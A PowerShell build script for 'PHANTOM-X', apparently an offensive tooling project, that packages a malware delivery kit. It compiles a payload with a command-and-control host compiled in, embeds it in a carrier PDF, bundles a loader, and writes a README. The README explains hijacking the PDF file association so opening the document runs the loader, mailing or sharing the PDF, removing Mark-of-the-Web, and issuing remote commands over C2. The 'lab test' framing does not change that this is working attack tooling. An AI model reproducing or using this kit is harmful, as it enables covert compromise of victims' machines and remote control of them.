#Requires -Version 5.1
<#
.SYNOPSIS
    PHANTOM-X :: build the kit that goes to a machine on another network.

.DESCRIPTION
    Assembles what has to exist on the FAR machine for a carrier test
    across the internet: the loader and the carrier PDF.

    THE SPLIT
        The loader is the SETUP. It goes once, and it registers the
        file association so that opening the PDF runs it.

        The PDF is the DELIVERY. It goes every time, and it is the only
        thing that crosses the network.

    That split is not a workaround. It is the shape of the real chain:
    the loader is one implant stage and the carrier is the next. A
    carrier with no loader on the machine is just a document.

    THE C2
        The payload inside the PDF points at the address given here, and
        that address has to be reachable FROM THE OTHER NETWORK. A
        192.168.x.x address is not. See the notes in the kit's own README
        for the three ways to make it reachable without a public IP.

.PARAMETER C2Host
    The address the C2 server is reachable at, as seen from the far
    machine. A hostname, a tunnel hostname, or a public address.

.PARAMETER C2Port
    The port the C2 server is listening on.

.PARAMETER Arm
    Which variant arm to embed.

.PARAMETER OutputDir
    Where the kit goes.

.EXAMPLE
    .\make_remote_kit.ps1 -C2Host c2box.trycloudflare.com -C2Port 9001 -Arm stealth
#>
[CmdletBinding()]
param(
    [string]$C2Host = '127.0.0.1',
    [int]$C2Port = 9001,
    [string]$Arm = 'stealth',
    [string]$OutputDir = ''
)

$ErrorActionPreference = 'Continue'
$here = $PSScriptRoot
$root = Split-Path (Split-Path $here -Parent) -Parent

if (-not $OutputDir) {
    $OutputDir = Join-Path $root "dist\phantom-x-remote-kit"
}
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

Write-Host ''
Write-Host ('=' * 70) -ForegroundColor DarkGray
Write-Host 'PHANTOM-X :: THE REMOTE TEST KIT' -ForegroundColor Cyan
Write-Host ('=' * 70) -ForegroundColor DarkGray
Write-Host "  C2 address : $C2Host`:$C2Port"
Write-Host "  arm        : $Arm"
Write-Host "  output     : $OutputDir"
Write-Host ''

# ---------------------------------------------------------------------------
# Build the arm, with the address compiled in
# ---------------------------------------------------------------------------
$staging = Join-Path $env:TEMP ("px-remote-" + [guid]::NewGuid().ToString('N').Substring(0, 8))
Push-Location $here
try {
    Write-Host '  building the arm ...' -ForegroundColor Gray
    & powershell.exe -NoProfile -ExecutionPolicy Bypass `
        -File (Join-Path $here 'build_variants.ps1') `
        -C2Host $C2Host -C2Port $C2Port -OutputDir $staging 2>&1 |
        Where-Object { $_ -match "OK   $Arm |FAIL|error" } |
        ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }
    $built = Join-Path $staging "px_payload_$Arm.exe"
    if (-not (Test-Path $built)) {
        Write-Host "[!] the arm did not build" -ForegroundColor Red
        exit 1
    }
    Copy-Item $built (Join-Path $OutputDir "px_payload_$Arm.exe") -Force
} finally {
    Pop-Location
    Remove-Item $staging -Recurse -Force -ErrorAction SilentlyContinue
}

# The loader.
$loader = Join-Path $root 'dist\native\px_loader.exe'
if (Test-Path $loader) {
    Copy-Item $loader $OutputDir -Force
} else {
    Write-Host '[!] the loader is not built; run build_all.ps1' -ForegroundColor Yellow
}

# The carrier PDF.
$payloadExe = Join-Path $OutputDir "px_payload_$Arm.exe"
$pdf = Join-Path $OutputDir 'px_carrier.pdf'
$makePdf = Join-Path $root 'phase1_pdf\make_attack_pdf.py'
$python = Get-Command python.exe -ErrorAction SilentlyContinue
if ($python -and (Test-Path $makePdf)) {
    & $python.Source $makePdf --payload $payloadExe --out $pdf `
        --name "px_payload_$Arm.exe" 2>&1 |
        Where-Object { $_ -match 'wrote|error' } |
        ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }
} else {
    Write-Host '[!] no Python or no generator; the carrier was not built' -ForegroundColor Yellow
}

# The instructions for whoever runs it on the far machine.
$readme = @"
================================================================================
PHANTOM-X :: REMOTE TEST KIT -- WHAT TO DO ON THE OTHER MACHINE
================================================================================

    The C2 address is already compiled in: $C2Host`:$C2Port

    It has to be reachable FROM HERE. If it is a 192.168.x.x or a
    10.x.x.x address it is not: that is a private address and it does
    not travel. Use a tunnel hostname, a public address, or a tailnet
    address that is exposed.

    The PDF opens the door. The loader is what opens it.


STEP 1 -- THE LOADER, ONCE
-------------------------------------------------------------------------------

    Copy px_loader.exe to the machine and run it against the PDF:

        .\px_loader.exe .\px_carrier.pdf

    If you want the document to do it by itself, register the
    association once:

        .\install_pdf_handler.ps1 -LoaderPath .\px_loader.exe

    After that, opening px_carrier.pdf is enough. The loader is
    infrastructure; the PDF is the delivery, and it is the only thing
    that crosses the network for every test.


STEP 2 -- THE PDF, EVERY TIME
-------------------------------------------------------------------------------

    Send px_carrier.pdf however you like. Mail, a chat client, a file
    share, a USB stick. It is a document with a program inside it.

    The receiving machine will have the Mark-of-the-Web on it, because
    it arrived from outside. That is not a problem to solve, it is a
    variable to measure: the same PDF behaves differently depending on
    how it arrived.

    If the document will not run at all:

        Unblock-File .\px_carrier.pdf

    Take the mark off deliberately, and record that you did. The
    difference between the marked and the unmarked run IS the
    measurement.


STEP 3 -- WATCH IT HAPPEN
-------------------------------------------------------------------------------

    On the C2 machine, the session appears:

        c2> list
        c2> exec 1 whoami
        c2> cap 1 avstatus

    The avstatus capability reports what the payload can see of the
    endpoint it landed on: whether its own evasion took, whether real
    time protection is on, and whether its own file is excluded from
    scanning. That is the context every result needs.


WHAT THIS TEST IS FOR
-------------------------------------------------------------------------------

    It answers one question: does the chain survive the trip? The
    carrier has to survive the transfer, the loader has to survive the
    receiving machine's policy, and the payload has to find a C2 that
    is not on the same network.

    It does not answer whether the endpoint will notice. That is a
    different question, and the lab has a separate measurement for it.
================================================================================
"@
$readme | Set-Content -Path (Join-Path $OutputDir 'WHAT-TO-DO-THERE.txt') -Encoding utf8

# The manifest.
$files = Get-ChildItem $OutputDir -File | Where-Object { $_.Extension -in @('.exe', '.pdf') }
$manifest = foreach ($f in $files) {
    [ordered]@{
        file   = $f.Name
        bytes  = $f.Length
        sha256 = (Get-FileHash $f.FullName -Algorithm SHA256).Hash.ToLower()
    }
}
$manifest | ConvertTo-Json -Depth 3 |
    Set-Content -Path (Join-Path $OutputDir 'manifest.json') -Encoding utf8

# The zip, so it is one file to move.
$zip = "$OutputDir.zip"
if (Test-Path $zip) { Remove-Item $zip -Force }
Compress-Archive -Path (Join-Path $OutputDir '*') -DestinationPath $zip -Force
$zsum = (Get-FileHash $zip -Algorithm SHA256).Hash.ToLower()
"$zsum  $(Split-Path $OutputDir -Leaf).zip" |
    Set-Content -Path "$zip.sha256" -Encoding ascii

Write-Host ''
Write-Host '  THE KIT' -ForegroundColor White
Get-ChildItem $OutputDir -File | Sort-Object Name | ForEach-Object {
    Write-Host ("    {0,-34} {1,9} bytes" -f $_.Name, $_.Length)
}
Write-Host ("    {0,-34} {1,9} bytes" -f (Split-Path $zip -Leaf), (Get-Item $zip).Length)
Write-Host ''
Write-Host '  WHAT GOES ONCE  : px_loader.exe' -ForegroundColor White
Write-Host '  WHAT GOES EVERY TIME: px_carrier.pdf' -ForegroundColor White
Write-Host ''
Write-Host ("  -> {0}" -f $OutputDir) -ForegroundColor Green
Write-Host ''
exit 0
